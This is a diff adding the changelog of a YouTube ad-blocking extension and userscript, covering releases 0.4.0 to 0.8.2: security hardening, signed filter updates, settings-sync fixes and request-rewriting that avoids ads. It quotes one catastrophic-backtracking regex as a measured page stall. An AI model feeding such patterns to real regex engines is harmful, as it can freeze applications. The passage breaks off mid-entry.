@@ -1,0 +1,1337 @@
+# Changelog
+
+All notable changes to YoutubeAdblock are documented here.
+
+## [Unreleased]
+
+## [0.8.2] (2026-09-07)
+
+### Added
+- The original approved blocked-play shield is preserved under
+  `assets/brand/concepts/`. A selection record points to the chosen direction,
+  with an untouched master stored separately from the generated icon family.
+
+### Changed
+- Install icons, the README banner, the repository social card, and all four
+  real extension captures were regenerated for this release.
+
+### Verified
+- The installed-extension capture still exercises live blocking counters and
+  packaged DNR evidence before writing any screenshot.
+
+## [0.8.1] (2026-09-05)
+
+### Added
+- A new shield and blocked-play identity now ships at every extension icon
+  size. The same source produces the README banner and GitHub social card.
+- Four current Control Center captures cover the protection overview, light
+  theme, Focus & Filters, and privacy-bounded browser match evidence. The
+  capture tool loads the real unpacked extension in a headless browser.
+- Marketing assets and screenshots now have repeatable npm commands and
+  repository contract checks.
+
+### Changed
+- The README now starts with the product, real captures, and two direct
+  install routes. Technical internals remain available without burying the
+  first-time user.
+- Extension and userscript descriptions no longer promise to be undetectable.
+  They describe the local blocking model and visible Control Center instead.
+- The userscript metadata now includes the project icon.
+- Generated extension and DNR files now use LF on every supported PowerShell
+  host, which keeps rebuilds byte-stable on Windows.
+- The release gate now validates the README version badge without pinning its
+  color, so visual identity updates don't weaken version lockstep.
+- Signed filter and webpack manifests advanced to revision 8, dated
+  2026-09-05, with expiry on 2027-03-04.
+- Repeat release builds now verify unchanged signed data without advancing its
+  revision. The signer accepts `--refresh` when a deliberate renewal is needed.
+
+### Removed
+- Browser command registrations and their manifest entries. Toolbar, context
+  menu, and userscript-menu controls remain available.
+- The old userscript-injection screenshot path. Marketing captures now prove
+  the unpacked extension loads and handles the exercised workload.
+
+### Verified
+- The screenshot run exercised the installed page-world engine and recorded
+  26 blocked requests plus 19 pruned responses. Its development-profile pass
+  also confirmed one packaged DNR match without exposing a request URL.
+- The opt-in live smoke now checks the production profile's real behavior:
+  DNR blocks the pagead probe while its permission-bounded diagnostics report
+  match evidence as unavailable.
+
+## [0.8.0] (2026-08-15)
+
+### Changed
+- **Documentation now describes the architecture that exists.** The README
+  described injecting the engine into the page through a `<script>` element
+  across two realms; there is no such injection anywhere in the source, and
+  the engine simply installs its proxies into the realm it loads into
+  (`"world": "MAIN"` for the extension). `extension/README.md` described two
+  mutually exclusive storage designs thirty lines apart, one of them the
+  pre-v0.7.0 bridge-owns-chunking model. Also corrects the cosmetic selector
+  count (21 built-in plus 64 in the signed list, not "150+") and the number
+  of Clutter-Free toggles.
+
+### Fixed
+- **DOM-bypass scripts are now neutralized before the browser runs them.**
+  The guard rewrote a matching inline `<script>` *after* calling the native
+  insertion, but appending an inline script executes it synchronously
+  inside `appendChild`, so the bypass had already succeeded and only the
+  counter moved. The check now runs before the native call, and also covers
+  scripts carried in inside a `DocumentFragment`.
+
+### Fixed
+- **Reading protection state no longer rebuilds the Control Center.** An
+  expired recovery pause was cleared from inside `isPaused()`, which
+  `isEnabled()` calls, and `isEnabled()` is evaluated inside the
+  `appendChild`/`insertBefore`/`replaceChild` and `setTimeout` proxies. The
+  first hot-path read after a pause lapsed therefore ran two stylesheet
+  rebuilds, a full panel rebuild and menu re-registration synchronously
+  inside a page's `appendChild`, with no try/catch between it and
+  `Node.prototype.appendChild`. The check is now pure; the cleanup runs from
+  the pause timer, with SPA navigation as a safety net.
+
+### Fixed
+- **Restore Defaults now actually restores the page.** It reset the toggles
+  and the cosmetic stylesheet but never the clutter stylesheet or the volume
+  gain node, so hidden elements stayed hidden while their switches read off
+  and boosted audio stayed boosted indefinitely. Settings import and
+  import-undo had the same gap. All four paths now reconcile the page state a
+  feature owns, not just its stored value.
+
+### Fixed
+- **Settings sync no longer stops silently.** Two defects introduced with the
+  v0.7.0 preference split: chunks were sliced by UTF-16 length against a
+  byte-denominated quota, so a CJK, Cyrillic or emoji blocklist produced
+  items up to three times over Chrome's 8,192-byte per-item ceiling and the
+  write failed with nothing reported; and the "already mirrored" marker was
+  set before the write rather than after, so one quota error or offline
+  moment latched sync off for the life of the service worker. Chunking is now
+  byte-aware and splits on whole code points, and only a completed publish is
+  remembered, so a failed attempt is retried.
+
+### Security
+- **The service worker now validates settings against a schema instead of
+  storing whatever the page sends.** The v0.7.0 broker moved storage into
+  the worker but still accepted any value under the allowlisted container
+  key. Because the engine runs in the MAIN world, the same realm as
+  YouTube's own scripts, the worker cannot prove *which* page-realm code
+  produced a value, so it now checks the value itself: an allowlist of
+  known keys, per-key types, size caps, enum shapes for consent, and a
+  refusal of `__proto__`/`constructor`/`prototype`. A malformed write keeps
+  the last good value rather than clobbering it, and refused keys are
+  reported back to the caller instead of failing silently.
+- **Anti-rollback floors are now monotonic in the worker.** A signed-update
+  revision may rise but never fall. Omitting the key no longer erases it;
+  the stored floor is carried forward. This is the one class of check
+  that still holds when the sender cannot be authenticated.
+- **The rule-library URL is restricted to credential-free HTTPS.** A
+  page-authored `filter_url` was previously accepted as-is and syncs to
+  every signed-in device.
+
+### Fixed
+- **Blocklist regex patterns can no longer stall the page.** The safety
+  validator rejected nested quantifiers but never checked its own root
+  frame, so a pattern like `a*a*a*b` was accepted despite having no nested
+  quantifier anywhere. It then backtracked polynomially. Measured before the
+  fix:
+  `/a*a*a*a*a*a*a*a*a*a*b/` against 32 characters took 9.4 seconds on the
+  main thread, inside the payload prune path. The validator now works atom
+  by atom and refuses two unbounded quantifiers (`*`, `+`, `{n,}`) that run
+  together without required text between them, with a specific
+  line-level reason shown in the blocklist editor. Non-capturing and named
+  groups, lazy quantifiers, and literal braces are now parsed correctly
+  rather than approximated. A test asserts a hard time budget over the
+  maximum haystack for every pattern the validator accepts.
+
+## [0.7.0] (2026-08-15)
+
+### Added
+- **Temporary recovery pause**: the Overview now offers a 5-minute,
+  30-minute, or this-tab pause that suspends every engine without touching
+  saved settings. It lives in memory only. It is never written to storage,
+  mirrored to sync, or included in an export. The pause restores itself when
+  the timer expires and leaves the persistent master switch as a separate
+  deliberate action.
+
+### Fixed
+- **`hidden` now actually hides**: the panel sets `display` on buttons and
+  cards, which overrides the user-agent `[hidden]` rule, so elements toggled
+  through the `hidden` property (the import-undo button, the new pause
+  controls) stayed on screen. Panel styles now honor the attribute.
+- **A temporary pause can no longer be exported as a permanent disable**:
+  settings export and the import-undo snapshot record the persisted
+  protection preference rather than the effective runtime state.
+
+### Changed
+- **Structural DOM-bypass detection**: inline-script screening no longer
+  keys off the literal substring `window,"fetch"`. It now requires both
+  halves of a real realm-lift: the script reaches into another realm
+  (`contentWindow`/`contentDocument`, or a freshly created iframe) *and*
+  installs a network native onto a global object, across
+  window/self/globalThis/top/parent, either quote style, and
+  defineProperty, dotted, or bracket assignment. Ordinary polyfills and
+  fetch wrappers, which never touch another realm, are left alone. The scan
+  is length-bounded so large bundles stay cheap, and blocked injections are
+  counted.
+
+### Added
+- **Community cache controls**: each consent card now reports how many
+  responses that service has cached this session and how old the oldest is,
+  with a per-service Clear cache button. Clearing is independent of consent,
+  the service stays allowed and simply starts from an empty cache, and
+  reuses the same teardown as revocation so the two paths cannot diverge.
+  Counts and ages only; no cached video identifier is exposed. Diagnostics
+  gained a matching per-service line.
+
+### Fixed
+- **Synced preferences separated from device-local state**: only a versioned
+  allowlist of user-authored preferences (protection switch, feature
+  overrides, blocklists, allowlist, duration bounds, filter URL, volume
+  boost) reaches `chrome.storage.sync`. Stats, rule and signature caches,
+  integrity results, signed-update revision floors, consent decisions, and
+  onboarding flags stay on the device. Stats tick every couple of seconds and
+  previously dragged the whole object into sync on each save; runtime-only
+  changes now produce no sync write at all, which keeps the extension clear
+  of Chrome's 1,800 writes/hour quota. A remote snapshot merges over local
+  preferences instead of replacing the object, so a second device can no
+  longer erase local-only state, downgrade an anti-rollback floor, or import
+  another machine's consent. Sync metadata carries a schema version and
+  checksum, byte accounting is UTF-8, and legacy version-1 snapshots
+  contribute only their preference keys.
+
+### Security
+- **Settings moved behind a trusted-context broker**: the MV3 service worker
+  is now the only component that touches `chrome.storage` for settings. The
+  isolated bridge relays a bounded two-verb protocol (`ytab:settings-read` /
+  `ytab:settings-write`) and can no longer write storage itself, so page-world
+  code cannot reach persistence even if it defeats the bridge's own
+  validation. The broker re-validates every request against the sender
+  (same extension, real tab, and YouTube URL) and independently re-checks
+  payload shape and size. Sync chunking, the oversized-payload tombstone, commit
+  ordering (chunks first, metadata last), partial-snapshot rejection, and
+  newest-wins conflict resolution all moved into the worker with contract
+  tests.
+
+## [0.6.0] (2026-08-14)
+
+### Security
+- **Signed update freshness (schema v2)**: signed filter and webpack-signature
+  metadata is now itself Ed25519-signed and carries an artifact role, a
+  monotonic revision, an expiry, and a key id. Clients persist the highest
+  accepted revision per role and refuse replayed (rollback), expired
+  (freeze), cross-role, or unknown-key updates, keeping the last known
+  good data with an explicit reason instead of silently accepting stale
+  rules. `tools/sign-filter-manifest.mjs` emits and verifies the new
+  envelope plus a detached `.manifest.json.sig`.
+
+### Security
+- **Least-privilege production manifest**: release builds no longer request
+  `tabs` (matching host permissions already expose `tab.url` for YouTube
+  tabs) or `declarativeNetRequestFeedback`, which Chrome documents for
+  unpacked-extension debugging. That permission moved to a development-only
+  `extension/manifest.dev.json` profile that the release packer and artifact
+  verifier both refuse to ship. Production diagnostics report matched-rule
+  evidence as unavailable instead of implying a blocking failure.
+
+### Added
+- **SABR-only response detection**: player responses that advertise formats
+  without per-format URLs and deliver media through `serverAbrStreamingUrl`
+  are detected and counted. On those sessions ad and content bytes share one
+  server-negotiated stream, so Diagnostics now states that URL-shaped
+  classification has no signal instead of implying it succeeded. JSON
+  pruning and cosmetic cleanup continue unchanged, and no playback-affecting
+  guess is made.
+
+### Security
+- **Compliance dialogs are never hidden or dismissed**: YouTube's
+  pre-playback age/identity verification prompts look structurally like the
+  anti-adblock enforcement modal. Candidates carrying verification wording
+  are now marked, exempted from every cosmetic hiding rule, excluded from
+  breakage detection, and reported in diagnostics as detected-but-untouched.
+  The marker list is data, so a signed filter update can extend it.
+
+### Fixed
+- **Control Center rail navigation**: the last destination could stop with
+  its controls sitting behind the footer on short panels (Music, TV, Kids).
+  The content area now keeps trailing scroll space so every destination can
+  reach the top. Browser smoke asserts real non-obscuration by hit-testing
+  each destination's heading and first control, and now runs the full
+  ten-destination rail sweep in both themes and at 1440x900 and 1920x1080
+  instead of only the canonical dark journey.
+
+### Added
+- **Chrome install guidance**: documented the Chrome 138+ "Allow User
+  Scripts" switch, Tampermonkey 5.5.0's injection and download permission
+  prompts, Violentmonkey's experimental Alternative page mode for MV3
+  `document-start` timing, and orientation for users arriving from
+  Manifest V2 blockers before the 2026-08-31 Chrome Web Store delisting.
+- **Safe settings import**: JSON import now validates the declared app and
+  schema version (future schemas are rejected with a clear message),
+  checks every field, URL, and size limit before writing, and shows an
+  exact add/change/clear preview that must be confirmed. The apply step is
+  atomic. A failed write rolls back every change, and a one-click undo
+  restores the pre-import settings for the rest of the session.
+- **Bounded user regex grammar**: channel/keyword/allowlist `/regex/`
+  entries are validated against a conservative safe subset (length and
+  entry-count caps, no backreferences or lookarounds, no quantified group
+  containing another quantifier or alternation) so catastrophic
+  backtracking cannot stall navigation. Rejected lines surface
+  line-specific errors in the blocklist editors instead of silently
+  degrading to substring matches; parsed lists are compiled once per
+  settings revision and match input is capped at 512 characters.
+- **Community service consent**: SponsorBlock segments, SponsorBlock skip
+  view-reports, DeArrow, and Return YouTube Dislike are now gated behind
+  explicit per-service, revocable consent enforced inside the network
+  wrappers themselves. Consent cards in the Control Center's SponsorBlock
+  and Enhancements sections state exactly what each service transmits, its
+  purpose, cache behavior, and data license. Legacy installs migrate to
+  "not yet allowed" (no requests) with a one-time notice; revoking a
+  service clears its caches and drops in-flight responses. Diagnostics
+  report per-service consent state.
+
+## [0.5.23] (2026-08-13)
+
+### Added
+- Added extension-only matched-rule evidence to Diagnostics. The service worker
+  queries the browser's five-minute DNR history, aggregates only packaged
+  `ytab-network-blocks` rule IDs and counts for the requesting YouTube tab, and
+  surfaces the result in both the Control Center and copied diagnostics.
+- Added deterministic service-worker, isolated-bridge, engine-report, and
+  browser-UI coverage for DNR diagnostics. The opt-in live unpacked-extension
+  smoke now proves a blocked pagead probe also appears as recent packaged-rule
+  evidence in the rendered Control Center.
+
+### Security
+- Added the narrow `declarativeNetRequestFeedback` extension permission needed
+  for matched-rule summaries. Request URLs and raw browser errors never cross
+  the trusted-context boundary; both background and bridge layers sanitize the
+  payload to IDs, counts, a bounded timestamp, and stable status reasons.
+- Added per-tab caching and a global 30-second query cooldown to keep repeated
+  page events within Chrome's matched-rule feedback quota during a live worker
+  session. Telemetry remains ephemeral and is never written to local or sync
+  storage.
+
+### Changed
+- Made generated DNR JSON byte-stable across Windows PowerShell 5.1 and
+  PowerShell 7 so a release rebuild does not dirty an otherwise clean tree.
+
+## [0.5.22] (2026-08-13)
+
+### Fixed
+- Fixed `Whitelist Mode`, `Duration Filter`, and `Creator Ad Allowlist`
+  appearing enabled in the Control Center while their runtime values were
+  actually undefined/off. Every exposed feature toggle now has an explicit
+  default and a repository contract prevents the UI/runtime schema drifting.
+- Fixed duration filtering doing nothing unless the channel or keyword blocker
+  was also enabled. Duration-only feed pruning now runs independently and has
+  a focused engine regression test.
+- Fixed the extension's `Block This Channel` context-menu action writing an
+  orphan setting instead of the persisted feature-overrides map. Existing
+  orphaned `channelBlocker` values migrate once so the action remains enabled
+  after reload.
+- Fixed the desktop Overview quick actions extending behind the Control Center
+  footer at both 1440x900 and 1920x1080. The summary layout is more compact and
+  browser smoke now fails if the actions leave the bounded content viewport.
+- Fixed the opt-in live-extension evidence artifact retaining YouTube query
+  strings, playlist identifiers, video path identifiers, and pagead audience
+  segments. Evidence URLs are now normalized to origin/path-only records with
+  sensitive path segments replaced.
+
+### Changed
+- Refreshed live desktop recon across YouTube home/search/watch, Shorts, Music,
+  TV, Kids setup, and no-cookie embed surfaces; retained explicit limits where
+  real ad creative, parental setup, or a referrer-bearing embed was unavailable.
+- Advanced the desktop Control Center visual reference to a revised
+  v2 mockup with all ten real destinations and an unclipped Overview, then
+  kept the implementation within the existing code-native DOM/CSS system.
+- Expanded browser smoke to capture every Control Center destination in the
+  canonical dark desktop journey and added optional mode/surface filters for
+  faster focused diagnosis.
+
+## [0.5.21] (2026-08-13)
+
+### Changed
+- Redesigned the real desktop Control Center from the selected concept with
+  a persistent section rail, searchable settings, dark/light design tokens,
+  overview metrics, explicit saved/sync status, bounded scrolling, and
+  in-dialog notifications that no longer cover settings.
+- Replaced the old mobile-inclusive browser-smoke matrix with desktop main
+  dark/light/wide, Music, TV, and Kids surfaces in both userscript and generated
+  extension modes.
+- Rebuilt `RESEARCH.md` from live 2026-08-13 surface/network recon and reduced
+  `ROADMAP.md` to incomplete, evidence-backed work with an explicit top five.
+- Made userscript + unpacked-extension ZIP the safe default release artifacts.
+  Stable-ID CRX packaging is now explicit and requires the matching private key.
+
+### Fixed
+- Fixed the release gate silently generating a new CRX identity when the
+  repository's pinned signing key was absent. CRX builds now fail before
+  packaging, verify the generated CRX identity directly, and artifact
+  verification honors the caller's selected userscript/ZIP/CRX/XPI set.
+- Fixed Windows PowerShell writing release provenance with a UTF-8 BOM that
+  caused the Node artifact verifier to reject otherwise valid JSON.
+- Fixed Return YouTube Dislike writing into the first hidden duplicate dislike
+  control instead of the rendered button on current watch pages.
+- Fixed volume boost failing to insert on YouTube Music, whose player bar does
+  not expose the main site's `.ytp-right-controls` container.
+- Fixed YouTube TV gaps by adding `/youtubei/v1/tenx_player` to the canonical
+  request contract and `ytu-ads-title-tray` to cosmetic cleanup.
+- Fixed notice bursts consuming the Control Center viewport; the dialog now
+  retains only the latest message and restores the page-level toast region when
+  it closes.
+- Fixed smooth-scroll frames temporarily highlighting a different rail item
+  after the user selected a settings destination.
+- Fixed migration import always classifying untyped plain text entries as
+  channels instead of keywords (ternary fallback was `'channel' : 'channel'`).
+- Fixed rejected-dangerous scriptlet pill rendering with unstyled `'error'`
+  tone; corrected to `'danger'` which has matching CSS.
+- Fixed ServiceWorker registration block returning `Promise.reject` which
+  caused unhandled rejections; now returns `Promise.resolve(undefined)`.
+- Fixed cosmetic CSS deduplication hash only checking first and last selectors;
+  mid-list selector changes could be silently ignored until page reload.
+- Fixed duplicate `.footer-hint` CSS rule block; merged into one.
+- Fixed attribution text using `opacity: 0.7` which reduced contrast below
+  WCAG AA; replaced with explicit `color: var(--text-3)`.
+- Fixed diagnostics leaking playlist IDs and extra query parameters from
+  watch URLs; all non-video-ID query params are now stripped.
+- Fixed version format validation in release tools to reject unsafe characters
+  that could enable command injection via `execSync`.
+- Fixed extension manifest description exceeding Chrome Web Store 132-char limit;
+  shortened to 123 chars with a store-policy preflight guard.
+- Fixed background-contract test mock missing `onMessage` and `permissions` APIs
+  added by the optional permissions feature.
+- Cached duration filter settings per feed-filter batch to avoid per-renderer
+  `getSetting` calls during feed filtering.
+- Removed redundant `querySelector('#movie_player')` call that duplicates
+  `getElementById`.
+- Fixed pluralization in migration import toast message.
+- Cleaned up duplicate gitignore blocks; added explicit `!CHANGELOG.md` allowlist.
+
+### Added
+- Added a narrow ad-exclusive fetch/XHR guard for DoubleClick, Google pagead,
+  and known YouTube ad paths. Synthetic empty JSON responses preserve normal
+  request lifecycles while mixed telemetry such as `generate_204` and
+  `log_event` remains outside the userscript guard.
+- Added a YouTube-initiator DNR rule for `google.com/pagead/*`, matching the
+  live `www.google.com/pagead/lvz` request observed on search/watch surfaces.
+- Added browser-level leak assertions proving guarded DoubleClick fetch and
+  Google pagead XHR calls never reach Playwright routing.
+- Added a gated isolated live unpacked-extension smoke. It verifies the packaged
+  DNR ruleset, expects a real pagead image probe to fail with
+  `net::ERR_BLOCKED_BY_CLIENT`, checks visible/audible ad state, and emits a
+  privacy-bounded report under ignored `dist/` output.
+- Added rendered-duplicate RYD, Music volume-rail, TV ad-tray, desktop theme,
+  settings-navigation, and notification-placement regression fixtures.
+- Added settled-animation captures for coherent dark/light implementation
+  screenshots while retaining the full navigation interaction assertions.
+- Added tracked before/concept visual references plus a tested implementation
+  screenshot for the desktop Control Center redesign.
+- Added community API cooldown and retry handling for SponsorBlock, DeArrow,
+  and RYD. HTTP 429 responses set per-service cooldowns with Retry-After
+  parsing, suppress repeated fetches until expiry, and report cooldown status
+  in diagnostics.
+- Added parser and interceptor performance budget tests that fail when 50k-line
+  filter parsing, repeated pruneObject, or webpack factory scanning exceed
+  fixed time budgets.
+- Added closed-breakage replay test fixtures for issue #1 (3-video playback
+  blocker) and issue #2 (clientScreen regression). Tests verify streamingData
+  and comments survive pruning, clientScreen rewrite is absent, and multi-video
+  navigation does not block playback.
+- Added a third-party license attribution preflight that verifies upstream
+  filter source credits, community API CC BY-NC-SA attribution in the UI,
+  README service disclosures, and LICENSE file presence.
+- Added a userscript marketplace preflight that validates metadata headers,
+  size limits, readable code, and external service disclosure for Greasy Fork
+  and OpenUserJS distribution.
+- Added release provenance metadata that records commit SHA, dirty-tree state,
+  Node/npm/Playwright versions, and build timestamp alongside release artifacts.
+  The artifact verifier validates the provenance file before writing checksums.
+- Added diagnostics redaction that strips video IDs from watch/Shorts URLs and
+  query strings from custom filter and SSAI URLs before they appear in copied
+  diagnostics.
+- Added store-policy preflight checks that fail the release gate on remote
+  executable URLs, broad host permissions, eval/new Function, invalid extension
+  ID, unsigned XPI naming, and stale background compatibility keys.
+- Converted SponsorBlock and RYD community API hosts from install-time
+  `host_permissions` to `optional_host_permissions` with runtime permission
+  request via the context menu. Permission status is tracked and reported in
+  diagnostics. Userscript behavior is unchanged.
+- Added a remote-rule capability denylist that rejects dangerous scriptlets
+  (e.g. trusted-set-constant, trusted-set-attr, evaldata-prune) from remote
+  filter lists. Rejected scriptlets are reported as rejected-dangerous in
+  diagnostics and the Control Center instead of silently counted as unsupported.
+- Added Ed25519 signing and integrity verification for the refreshable webpack
+  signature database. Remote signatures are rejected when tampered, diagnostics
+  reports integrity status, and the release gate signs/verifies both the filter
+  list and the webpack signature database.
+- Added a release-publication guard that verifies the current version tag has a
+  GitHub release with matching asset names and checksums. Available via
+  `--verify-publication` flag on the artifact verifier or `-VerifyPublication`
+  switch on the release gate.
+
+## [0.5.20] (2026-06-28)
+
+### Added
+- Added PlayerResponse `serverStitchedAd` detection with de-duplicated
+  SSAI counters, a Control Center warning, and copied diagnostics context for
+  server-side ads that JSON pruning cannot remove.
+
+## [0.5.19] (2026-06-28)
+
+### Added
+- Added a DASH/HLS manifest scrub fallback for text manifests, removing
+  googlevideo `ctier=SA`/`ctier=SR` ad segment references through fetch/XHR
+  interception when browser DNR is unavailable.
+
+## [0.5.18] (2026-06-28)
+
+### Added
+- Added a refreshable webpack ad-signature database backed by
+  `webpack-ad-signatures.json`, with sanitized token loading, cached startup
+  fallback, diagnostics output, and browser-smoke fixture coverage.
+
+## [0.5.17] (2026-06-28)
+
+### Changed
+- Extracted Control Center, diagnostics, toast, menu, and feature-toggle copy
+  into a central `STRINGS` table as the prerequisite for future localization.
+
+## [0.5.16] (2026-06-28)
+
+### Added
+- Added BlockTube/FilterTube-style migration import for channel and keyword
+  blocklists, including merge-safe normalization and rejected-entry previews.
+
+## [0.5.15] (2026-06-28)
+
+### Added
+- Added safe local support for selected uBO YouTube quick-fix scriptlets:
+  response field replacement, DOM-bypass prevention, and `nano-stb` timer
+  coverage now report as supported and feed the existing bundled engines.
+
+## [0.5.14] (2026-06-28)
+
+### Added
+- Added release artifact verification for ZIP entry paths, CRX3 structure and
+  signature, stable Chromium extension ID, unsigned-XPI naming, and SHA-256
+  checksum output.
+
+## [0.5.13] (2026-06-28)
+
+### Changed
+- Removed inactive DeArrow thumbnail host access from the MV3 extension
+  manifest while keeping userscript-only DeArrow thumbnail access available.
+
+## [0.5.12] (2026-06-28)
+
+### Fixed
+- Fixed the Firefox release contract so local XPI output is explicitly
+  development-only and unsigned. README and extension docs no longer promise a
+  signed persistent Firefox XPI unless AMO/web-ext signing is actually wired.
+
+## [0.5.11] (2026-06-28)
+
+### Added
+- Added a Playwright-powered browser smoke matrix for userscript and extension
+  Control Center flows across desktop YouTube, mobile YouTube, YouTube Music,
+  and YouTube Kids fixture hosts. The smoke opens the panel, toggles
+  protection, refreshes rules through the signed local fixtures, exercises the
+  block-channel event, checks console errors, and captures screenshots under
+  `dist/browser-smoke/`.
+
+### Fixed
+- Fixed the Control Center smoke path so the master switch remains pointer-clickable
+  and the panel stays viewport-bounded across desktop, mobile, Music, and Kids
+  fixture surfaces.
+
+## [0.5.10] (2026-06-28)
+
+### Added
+- Added Ed25519 verification for the recommended remote filter list, with a
+  tracked manifest and detached signature. Tampered default rules now fail
+  verification and leave cached or built-in rules active, while custom Rule
+  Library URLs remain allowed with an unsigned-source warning.
+
+## [0.5.9] (2026-06-28)
+
+### Added
+- Added userscript-manager onboarding diagnostics. Control Center and copied
+  diagnostics now report whether YoutubeAdblock evaluated at `document-start`
+  or likely loaded late, with setup guidance for Chrome MV3 user-script
+  manager issues.
+
+## [0.5.8] (2026-06-28)
+
+### Changed
+- Removed the default extension keyboard shortcut. Toolbar and context-menu
+  actions remain primary, and users can bind optional browser shortcuts from
+  their extension shortcut settings.
+
+## [0.5.7] (2026-06-28)
+
+### Added
+- Added an optional Force Original Audio engine that uses YouTube's player
+  audio-track API to switch from auto-dubbed or translated tracks back to an
+  explicitly marked original track.
+
+## [0.5.6] (2026-06-28)
+
+### Added
+- Added `Build-Release.ps1`, a one-command local release gate that cleans
+  stale artifacts, regenerates `extension/main.js` and DNR output, runs
+  syntax checks and the Node test suite, validates version/artifact freshness,
+  and writes current userscript, ZIP, optional XPI, and CRX artifacts.
+
+## [0.5.5] (2026-06-28)
+
+### Added
+- Added filter coverage reporting for applied selectors, applied prune paths,
+  network-only filter rules, dropped unsafe selectors, supported scriptlets,
+  and unsupported scriptlets in the Control Center and diagnostics report.
+- Added `extension/rules/network-rules-source.json` as the typed source for
+  DNR output and userscript intercept-pattern drift checks. `Build-Extension.ps1`
+  now regenerates `extension/rules/network-blocks.json` from that source.
+
+## [0.5.4] (2026-06-28)
+
+### Added
+- Added stable channel blocklist identities. Channel blocklists and ad
+  allowlists now accept display names, `UC...` channel IDs, `@handles`,
+  channel URLs, and regex while preserving existing name-only behavior.
+- Added Control Center import/export tools for blocklists and local settings:
+  copy JSON, copy plain channel text, import JSON, or import plain channel
+  text without leaving YouTube.
+
+## [0.5.3] (2026-06-28)
+
+### Fixed
+- Restored the extension context-menu "Block This Channel" action by wiring
+  the service-worker click handler to the existing page-world block-channel
+  event and covering the relay/storage path with regression tests.
+
+## [0.5.2] (2026-06-28)
+
+### Fixed
+- Repaired the local-build repo contract after GitHub Actions removal. The
+  repo-contract tests now assert the current local `Build-Extension.ps1` /
+  `Build-CRX.ps1` release path instead of importing a deleted workflow.
+- Updated the extension README to document local release steps and the
+  intentionally iconless manifest state.
+
+## [0.5.1] (2026-06-16)
+
+### Added
+- **Extension settings sync.** MV3 builds now mirror the extension settings
+  bundle into `chrome.storage.sync` using 7 KB chunks below the browser
+  8 KB/item and 100 KB total sync quotas. Signed-in browser profiles receive
+  toggles, blocklists, allowlists, and duration thresholds automatically.
+
+### Changed
+- **Storage conflict policy.** Extension settings now carry local metadata and
+  resolve cross-profile conflicts by newest write timestamp. Oversized
+  blocklists still save to `chrome.storage.local` and localStorage, but write an
+  oversized sync tombstone so stale sync data does not overwrite the local copy.
+
+## [0.5.0] (2026-06-12, audit hardening)
+
+### Fixed
+- **Object.assign hook over-broad**: `injectNoAdFlag` now only runs on objects
+  that contain `playbackContext` or `contentPlaybackContext`, preventing the
+  no-ad flag from being injected into unrelated objects like analytics payloads,
+  UI config, or third-party code passing through `Object.assign`.
+- **Breakage self-test false positive on age gates**: tightened the enforcement
+  popup selector from a broad `tp-yt-paper-dialog[aria-label]` match (which
+  hit legitimate age-verification and content-warning dialogs) to specifically
+  require `ytd-enforcement-message-view-model` inside the dialog.
+- **SponsorBlock stale video skip**: added `video.isConnected` check in the
+  timeupdate handler so a detached `<video>` element from a prior SPA
+  navigation can't trigger segment skips on the wrong video.
+- **Duplicate iframe load listeners**: DOM bypass prevention now marks
+  bridged iframes with a sentinel to prevent re-attaching the `load`
+  listener when the same iframe is re-inserted into the DOM.
+- **Webpack chunk regex on oversized factories**: added a 200KB size guard
+  before running the ad-signature regex against webpack factory source
+  strings, preventing unnecessary CPU work on mega-bundles.
+
+### Improved
+- **Inline styles moved to CSS classes**: blocklist textarea styling and
+  attribution note styling now use `.ytab-blocklist-textarea` and
+  `.ytab-attribution` CSS classes instead of inline `style.cssText`,
+  enabling theme-consistent colors via CSS variables (`--text`,
+  `--panel-border`, `--accent`) and proper focus-ring styling.
+- **Accessibility**: locked toggle inputs now carry `aria-disabled="true"`;
+  toast notification region has explicit `role="status"`.
+
+## [0.5.0] (2026-06-12)
+
+Anti-fake-buffering engine, engine health diagnostics, API compliance,
+and cleanup of the retired clientScreenSpoof toggle.
+
+### Added
+- **No-ad request injection.** Outbound `/player` and `/get_watch` request
+  bodies now carry `playbackContext.contentPlaybackContext.isInlinePlaybackNoAd:
+  true`, which tells InnerTube to omit ad payloads and the SABR
+  fake-buffering backoff. It is injected through the fetch proxy, the XHR
+  proxy, and a new `Object.assign` hook, so the flag lands even when
+  YouTube's locker script freezes `fetch`/`JSON.parse` first. Covers both
+  cold loads (external links) and SPA navigation.
+- **Engine health tracking.** Every engine install records its outcome
+  (`ok` / `degraded` / `failed`) and which natives `safeOverride` could
+  not replace. The Control Center Overview now renders a
+  "Protection Degraded" warning naming the affected engines and locked
+  natives, and the diagnostics snapshot includes the full health map.
+- **Third-party API attribution.** SponsorBlock (CC BY-NC-SA 4.0) and
+  Return YouTube Dislike attribution notes now render in the Control Center
+  feature sections, linking to the upstream projects.
+- **Stale override migration.** `getFeatureOverrides` now drops unknown
+  feature keys (e.g. the retired `clientScreenSpoof`) from persisted storage
+  on first load, preventing orphaned toggles from surviving indefinitely.
+
+### Changed
+- **DeArrow gated off in the extension build.** The DeArrow API is
+  "free to use for all non browser-extensions" per the maintainer's terms.
+  Until explicit permission is granted, the toggle is disabled and
+  read-only in the extension build; the userscript build is unaffected.
+- **Outbound request rewrite toggle** moved from Core Blocking to
+  Anti-Detection and relabeled "No-ad request signal" to reflect its
+  current purpose (the old clientScreen body rewrite is gone).
+- **Webpack chunk hook** comment block corrected: it does replace matching
+  ad-rendering factories with no-op modules (not hint-only as the stale
+  v0.4.0 comment said). The `pruned` stat accurately counts replacements.
+
+### Removed
+- **`clientScreenSpoof` feature toggle.** Retired in v0.4.1 after breaking
+  playback (issue #2); the toggle remained in the UI as a no-op. Now fully
+  removed from defaults, FEATURE_GROUPS, and the UI. Stored overrides
+  containing the key are automatically cleaned.
+
+## [0.4.1] (2026-06-03)
+
+Critical playback fix.
+
+### Fixed
+- **Broken video player + missing comments on `/watch` (issue #2).** The
+  `clientScreenSpoof` feature rewrote outbound `/youtubei/v1/player` (and
+  `/youtubei/v1/get_watch`) request bodies, setting
+  `context.client.clientScreen = 'CHANNEL'`. YouTube treats that as a
+  channel-page preview surface and returns `playabilityStatus = UNPLAYABLE`
+  with **no `streamingData`**, so the player never renders (no video, no
+  play button) and the watch-page hydration aborts, taking the comments
+  section with it. Verified against the live authenticated player endpoint:
+  the identical request returns `OK` + 14 adaptive formats without the spoof
+  and `UNPLAYABLE` + 0 formats with it.
+  - The spoof no longer rewrites the player/watch request bodies under any
+    circumstance (removed in both the fetch and XHR proxies).
+  - `clientScreenSpoof` now defaults to **off**. Existing users who had it
+    persisted as on are protected regardless, because the harmful mutation
+    is gone, the toggle can no longer strip `streamingData`.
+
+## [0.4.0] (2026-04-22)
+
+Major capability release. Anti-detect hardening, three new user-visible
